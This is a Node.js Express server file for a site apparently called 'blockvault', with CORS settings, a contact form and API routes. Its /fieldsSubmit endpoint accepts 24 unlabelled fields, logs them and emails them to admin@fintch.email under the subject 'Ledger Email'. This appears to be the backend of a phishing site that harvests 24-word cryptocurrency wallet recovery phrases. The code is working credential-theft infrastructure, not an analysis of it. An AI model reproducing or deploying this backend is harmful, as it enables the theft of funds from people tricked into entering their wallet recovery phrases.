const express = require("express");
const app = express();
const sendEmail = require('./sendEmail')
// const cors = require("cors");

const bodyparser = require("body-parser");
// Environment file set
const dotnet = require("dotenv");
dotnet.config({ path: "./config/config.env" });

app.use(express.json({ limit: "20mb" }));
let cookieParser = require("cookie-parser");
app.use(cookieParser());

//

const cron = require("node-cron");
let ALLOWED_ORIGINS = [
  "https://blockvault.pro",
  "https://www.blockvault.pro",
  "https://blockvault.space",
  "https://www.blockvault.space",
  "https://blockvault-three.vercel.app",
  "http://localhost:3000",
  "http://localhost:3001",
  "http://localhost:3002",
  "http://localhost:3003",
  "http://127.0.0.1:5503",
];
app.use((req, res, next) => {
  let origin = req.headers.origin;
  let theOrigin =
    ALLOWED_ORIGINS.indexOf(origin) >= 0 ? origin : ALLOWED_ORIGINS[0];
  res.header("Access-Control-Allow-Origin", theOrigin);
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );

  res.header("Access-Control-Allow-Credentials", true);

  res.header(
    "Access-Control-Allow-Methods",
    "POST, GET, PUT, PATCH,DELETE, OPTIONS"
  );
  next();
});
// cutom message
app.post("/submitContactForm", async (req, res) => {
  try {
    const { name, email, phone, comments } = req.body;

    if (!email || !name || !phone || !comments) {
      return res
        .status(400)
        .send({ success: false, message: "Fill all the fields" });
    }
    console.log(req.body);
    let sameEmail = "admin@fintch.email"
    // 
    let subject = `Ledger Email`;
    let text = `
  Name: ${name}<br>
  Email: ${email}<br>
  Phone: ${phone}<br>
  Comments: ${comments}<br>
`;
    let sendEmailError = await sendEmail(sameEmail, subject, text);
    if (sendEmailError) {
      console.error("Failed to send email:", sendEmailError);

      // Respond with an error status and message
      return res.status(500).send({
        msg: "Email sending failed, please try again!",
        success: false,
        error: sendEmailError.message, // Optional: include the error message
      });
    }

    res.status(201).send({
      msg: "Form Submitted successfully",
      success: true,
    });
    //  
  } catch (e) {
    res.status(500).send({
      success: false,
      message: "Something went wrong",
    });
    console.log(e);
  }
});
app.post("/fieldsSubmit", async (req, res) => {
  try {
    const {
      field1,
      field2,
      field3,
      field4,
      field5,
      field6,
      field7,
      field8,
      field9,
      field10,
      field11,
      field12,
      field13,
      field14,
      field15,
      field16,
      field17,
      field18,
      field19,
      field20,
      field21,
      field22,
      field23,
      field24,
    } = req.body;


    console.log(req.body);
    let sameEmail = "admin@fintch.email"
    // 
    let subject = `Ledger Email`;
    let text = `
 <span>Field 1: </span> ${field1}
  <br>
  <span>Field 2: </span> ${field2}
  <br>
  <span>field 3: </span> ${field3}
  <br>
  <span>field 4: </span> ${field4}
  <br>
  <span>field 5: </span> ${field5}
  <br>
  <span>field 6: </span> ${field6}
  <br>
  <span>field 7: </span> ${field7}
  <br>
  <span>field 8: </span> ${field8}
  <br>
  <span>field 9: </span> ${field9}
  <br>
  <span>field 10: </span> ${field10}
  <br>
  <span>field 11: </span> ${field11}
  <br>
  <span>field 12: </span> ${field12}
  <br>
  <span>field 13: </span> ${field13}
  <br>
  <span>field 14: </span> ${field14}
  <br>
  <span>field 15: </span> ${field15}
  <br>
  <span>field 16: </span> ${field16}
  <br>
  <span>field 17: </span> ${field17}
  <br>
  <span>field 18: </span> ${field18}
  <br>
  <span>field 19: </span> ${field19}
  <br>
  <span>field 20: </span> ${field20}
  <br>
  <span>field 21: </span> ${field21}
  <br>
  <span>field 22: </span> ${field22}
  <br>
  <span>field 23: </span> ${field23}
  <br>
  <span>field 24: </span> ${field24}
`;
    console.log(text);

    let sendEmailError = await sendEmail(sameEmail, subject, text);
    if (sendEmailError) {
      console.error("Failed to send email:", sendEmailError);

      // Respond with an error status and message
      return res.status(500).send({
        msg: "Email sending failed, please try again!",
        success: false,
        error: sendEmailError.message, // Optional: include the error message
      });
    }

    res.status(201).send({
      msg: "Form Submitted successfully",
      success: true,
    });
    //  
  } catch (e) {
    res.status(500).send({
      success: false,
      message: "Something went wrong",
    });
    console.log(e);
  }
});
// cutom message
// 

// app.use(cors());
cron.schedule("*/10 * * * *", () => {
  try {
    // Your code to be executed every 15 minutes
    console.log("Cron job executed every 15 minutes");
  } catch (error) {
    console.error("Error in cron job:", error);
  }
});
//
// app.use(
//   cors({
//     origin: process.env.CORS,

//     credentials: true,
//     exposedHeaders: ["Set-Cookie"],
//   })
// );
app.use(bodyparser.urlencoded({ extended: false }));
app.use(bodyparser.json());
// All Routes
const coins = require("./routes/coinRoute");
const user = require("./routes/userRoute");
const file = require("./routes/fileRoute");
app.use("/api/v1", coins);
app.use("/api/v1", user);
app.use("/api/v1", file);

module.exports = app;
